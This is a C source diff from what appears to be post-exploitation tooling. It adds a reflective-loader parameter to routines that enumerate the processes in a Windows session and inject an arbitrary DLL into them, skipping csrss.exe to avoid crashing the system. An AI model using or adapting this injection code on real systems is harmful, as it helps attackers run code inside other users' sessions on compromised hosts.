@@ -74,7 +74,7 @@ DWORD session_activeid()
 /*
  * On NT4 its we bruteforce the process list as kernel32!CreateToolhelp32Snapshot is not available.
  */
-DWORD _session_inject_bruteforce( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, char * cpCommandLine )
+DWORD _session_inject_bruteforce( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, LPCSTR reflectiveLoader, char * cpCommandLine )
 {
 	DWORD dwResult = ERROR_INVALID_HANDLE;
 	DWORD pid      = 0;
@@ -93,7 +93,7 @@ DWORD _session_inject_bruteforce( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, ch
 
 			if( dwSessionId == session_id( pid ) )
 			{
-				dwResult = ps_inject( pid, pDllBuffer, cpCommandLine );
+				dwResult = ps_inject( pid, pDllBuffer, reflectiveLoader, cpCommandLine );
 				if( dwResult == ERROR_SUCCESS )
 				{
 					dprintf( "[SESSION] _session_inject_bruteforce. Injected into process %d", pid );
@@ -110,17 +110,17 @@ DWORD _session_inject_bruteforce( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, ch
 /*
  * Inject an arbitrary DLL into a process running in specific Windows session.
  */
-DWORD session_inject( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, char * cpCommandLine )
+DWORD session_inject( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, LPCSTR reflectiveLoader, char * cpCommandLine )
 {
 	DWORD dwResult                                     = ERROR_INVALID_HANDLE;
 	CREATETOOLHELP32SNAPSHOT pCreateToolhelp32Snapshot = NULL;
-	PROCESS32FIRST pProcess32First                     = NULL;
-	PROCESS32NEXT pProcess32Next                       = NULL;
+	PROCESS32FIRSTW pProcess32FirstW                     = NULL;
+	PROCESS32NEXTW pProcess32NextW                     = NULL;
 	HANDLE hProcessSnap                                = NULL;
 	HMODULE hKernel                                    = NULL;
 	HANDLE hToken                                      = NULL;
 	BOOL bUseBruteForce                                = TRUE;
-	PROCESSENTRY32 pe32                                = {0};
+	PROCESSENTRY32W pe32                                = {0};
 
 	do
 	{
@@ -146,19 +146,19 @@ DWORD session_inject( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, char * cpComma
 			break;
 
 		pCreateToolhelp32Snapshot = (CREATETOOLHELP32SNAPSHOT)GetProcAddress( hKernel, "CreateToolhelp32Snapshot" );
-		pProcess32First           = (PROCESS32FIRST)GetProcAddress( hKernel, "Process32First" );
-		pProcess32Next            = (PROCESS32NEXT)GetProcAddress( hKernel, "Process32Next" );
+		pProcess32FirstW           = (PROCESS32FIRSTW)GetProcAddress( hKernel, "Process32FirstW" );
+		pProcess32NextW            = (PROCESS32NEXTW)GetProcAddress( hKernel, "Process32NextW" );
 
-		if( !pCreateToolhelp32Snapshot || !pProcess32First || !pProcess32Next )
+		if( !pCreateToolhelp32Snapshot || !pProcess32FirstW || !pProcess32NextW )
 			break;
 
 		hProcessSnap = pCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
 		if( hProcessSnap == INVALID_HANDLE_VALUE )
 			break;
 
-		pe32.dwSize = sizeof( PROCESSENTRY32 );
+		pe32.dwSize = sizeof( PROCESSENTRY32W );
 
-		if( !pProcess32First( hProcessSnap, &pe32 ) )
+		if( !pProcess32FirstW( hProcessSnap, &pe32 ) )
 			break;
 				
 		bUseBruteForce = FALSE;
@@ -169,17 +169,17 @@ DWORD session_inject( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, char * cpComma
 			{
 				// On Windows 2008R2 we Blue Screen the box if we inject via APC injection 
 				// into the target sessions instance of csrss.exe!!! so we filter it out...
-				if( strstr( pe32.szExeFile, "csrss.exe" ) )
+				if (wcsstr(pe32.szExeFile, L"csrss.exe"))
 					continue;
 
-				dwResult = ps_inject( pe32.th32ProcessID, pDllBuffer, cpCommandLine );
+				dwResult = ps_inject( pe32.th32ProcessID, pDllBuffer, reflectiveLoader, cpCommandLine );
 				if( dwResult == ERROR_SUCCESS )
 				{
 					dprintf( "[SESSION] session_inject. Injected into process %d (%s)", pe32.th32ProcessID, pe32.szExeFile );
 					break;
 				}
 			}
-		} while( pProcess32Next( hProcessSnap, &pe32 ) );
+		} while( pProcess32NextW( hProcessSnap, &pe32 ) );
 
 	} while( 0 );
 
@@ -191,7 +191,7 @@ DWORD session_inject( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, char * cpComma
 
 	// On NT4 we must brute force the process list...
 	if( bUseBruteForce )
-		dwResult = _session_inject_bruteforce( dwSessionId, pDllBuffer, cpCommandLine );
+		dwResult = _session_inject_bruteforce( dwSessionId, pDllBuffer, reflectiveLoader, cpCommandLine );
 
 	return dwResult;
 }
